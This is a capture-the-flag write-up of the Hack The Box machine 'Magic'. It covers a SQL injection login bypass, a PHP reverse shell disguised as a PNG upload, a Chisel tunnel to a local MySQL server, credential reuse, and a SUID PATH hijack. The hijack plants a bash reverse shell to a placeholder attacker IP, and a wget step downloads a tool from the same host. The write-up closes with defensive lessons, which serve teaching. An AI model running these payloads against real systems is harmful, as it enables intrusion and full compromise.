---
title: "Magic: SQL Injection, File Upload Bypass, and PATH Hijack"
description: "SQL injection in a login page and PNG magic-byte upload evasion provide a foothold; MySQL credentials tunneled through Chisel and reused admin credentials enable lateral movement, and a SUID sysinfo binary is hijacked through PATH to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - sql-injection
  - privilege-escalation
---

## Summary

Magic is a retired Easy Linux machine featuring a web application with an SQL injection vulnerability in the login page, granting access to an admin upload panel. The file upload restriction is bypassed by injecting PNG magic bytes into a PHP reverse shell. After obtaining a foothold as `<WEB_SERVICE_ACCOUNT>`, MySQL credentials found in the application configuration are used to tunnel the local database and extract admin credentials, which are reused for the `<LAB_USER>` user. Privilege escalation is achieved through a PATH hijack on the SUID binary `/bin/sysinfo`, which calls system commands — including `cat` — without absolute paths.

All target and operator-specific values below are sanitized placeholders.

## Context and Objective

- **Target OS:** Linux (Ubuntu 18.04)
- **Difficulty:** Easy
- **Open services:** SSH (22), HTTP (80)
- **Goal:** Compromise the target, escalate to `<LAB_USER>`, then escalate to `<PRIVILEGED_ACCOUNT>`.

## Approach and Evidence

### Stage 1 — Port Scanning

Port scanning with `rustscan` reveals two open ports:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Magic-TCP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Two services are available: SSH on port 22 and Apache HTTP on port 80 hosting a "Magic Portfolio" site.

### Stage 2 — Web Enumeration and SQL Injection

Directory enumeration with `feroxbuster` discovers a login page at `/login.php`:

```bash
feroxbuster --url http://<TARGET_IP> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

The login form is vulnerable to SQL injection. An authentication bypass payload grants access to the admin panel:

```sql
' OR '1'='1
```

The admin panel reveals an upload page at `/upload.php`.

### Stage 3 — File Upload Restriction Bypass

The upload page restricts files to image types (`JPG`, `JPEG`, `PNG`), checking file magic bytes rather than extension alone. A PHP reverse shell is disguised as a valid PNG file by prepending the PNG magic byte header:

```bash
python3 ~/Tools/mime-file-forge/fforge.py forge --payload-file revshell.php -t png -o fakepic.php.png
```

```text
Wrote: fakepic.png
Signature: png (image/png)
Separator: newline
Payload bytes: 2585
Total bytes: 2594
```

The resulting file passes the magic-byte check while retaining its PHP payload.

### Stage 4 — Reverse Shell

A listener is started on the attacker machine:

```bash
penelope -p <LISTENER_PORT>
```

The uploaded shell is accessed at the uploads directory, executing the PHP code and returning a reverse shell as `<WEB_SERVICE_ACCOUNT>`.

### Stage 5 — Database Credential Discovery

The application's database configuration file contains MySQL credentials in plaintext:

```bash
cat /var/www/Magic/db.php5
```

```php
private static $dbUsername = '<DB_USER>';
private static $dbUserPassword = '<DB_PASSWORD>';
```

MySQL is bound to localhost only, making it inaccessible directly from the attacker machine:

```bash
ss -tulpn
```

```text
tcp    LISTEN   0   80   127.0.0.1:3306   0.0.0.0:*
```

### Stage 6 — MySQL Tunneling via Chisel

Chisel is transferred to the target and used to set up a reverse tunnel, forwarding the remote MySQL port to a local port on the attacker machine:

```bash
wget http://<ATTACKER_IP>/linux/chisel
chmod +x chisel
```

A Chisel reverse server is started on the attacker machine:

```bash
chisel server --reverse -p <CHISEL_PORT>
```

On the target, the Chisel client connects back, forwarding port 13306 on the attacker side to MySQL on the target:

```bash
./chisel client <ATTACKER_IP>:<CHISEL_PORT> R:13306:127.0.0.1:3306
```

The tunneled MySQL service is accessible from the attacker machine:

```bash
mysql -h 127.0.0.1 -P 13306 -u <DB_USER> -p
```

### Stage 7 — Database Enumeration

Inside the MySQL shell, the `Magic` database is explored:

```sql
show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
```

```sql
USE Magic;
SHOW TABLES;
DESCRIBE login;
SELECT * FROM login;
```

```text
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | <ADMIN_PASSWORD> |
+----+----------+----------------+
```

The admin password is recovered from the `login` table.

### Stage 8 — Privilege Escalation to theseus

The database password is reused for the `<LAB_USER>` system user:

```bash
su - <LAB_USER>
```

```text
Password: <ADMIN_PASSWORD>
```

```text
<LAB_USER>@<TARGET_HOST>:~$
```

The user flag is accessible from the `<LAB_USER>` home directory.

### Stage 9 — SUID Binary Discovery

SUID enumeration reveals a custom binary with the setuid bit set:

```bash
python3 suid3num.py
```

```text
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/bin/sysinfo
------------------------------
```

### Stage 10 — Sysinfo PATH Hijack

Examining the binary with `strings` reveals that it calls several system commands without specifying absolute paths:

```bash
strings /bin/sysinfo
```

```text
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
```

The `cat` command is invoked without a full path. By prepending `/tmp` to `PATH`, a malicious `cat` script is executed instead when `/bin/sysinfo` runs:

```bash
export PATH=/tmp:$PATH
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"' > /tmp/cat
chmod +x /tmp/cat
sysinfo
```

```text
<PRIVILEGED_ACCOUNT>@<TARGET_HOST>:/#
```

The `<PRIVILEGED_RESULT>` is captured.

## Challenges and Decisions

- MySQL bound to localhost required an additional tunneling step (Chisel) before credential extraction could proceed.
- The file upload restriction was based on magic bytes rather than extension alone, requiring a PNG-header injection tool instead of a simple rename.
- The SUID binary `/bin/sysinfo` invoked `cat` without an absolute path, enabling PATH hijacking with a minimal attacker-controlled script.

## Outcome

Complete compromise of the target was achieved: web access via SQL injection, file upload bypass for initial shell, database credential extraction via tunneling, lateral movement to `<LAB_USER>` via credential reuse, and privilege escalation via SUID PATH hijack.

## Lessons and Recommendations

- SQL injection on login pages remains a critical vulnerability; parameterized queries or prepared statements prevent authentication bypass entirely.
- File upload restrictions based solely on magic bytes are trivially bypassed; server-side validation should also verify file content and enforce strict storage policies.
- Application configuration files containing plaintext database credentials are a high-value target; use environment variables or secret management systems.
- SUID binaries that invoke system commands without absolute paths are susceptible to PATH hijacking; all external calls should use absolute paths or validated `PATH` values.
- Credential reuse between database accounts and system accounts bridges web access and shell access; enforce unique credentials across tiers.

## References

- HTB machine: [Magic](https://app.hackthebox.com/machines/Magic)
